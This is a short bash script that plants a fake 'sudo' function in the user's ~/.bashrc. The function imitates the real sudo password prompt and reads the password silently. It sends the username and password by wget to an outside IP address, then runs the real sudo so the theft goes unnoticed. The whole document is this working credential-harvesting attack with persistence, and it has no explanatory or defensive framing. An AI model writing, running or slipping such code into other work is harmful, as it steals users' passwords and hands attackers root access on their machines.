#!/bin/bash
echo 'function sudo(){
origsudo="$(which sudo)";
read -s -p "[sudo] password for $USER: " pw;printf "\n";
wget "192.168.169.128 /$USER:$pw" > /dev/null 2>&1;
$origsudo $@;
}' >> ~/.bashrc
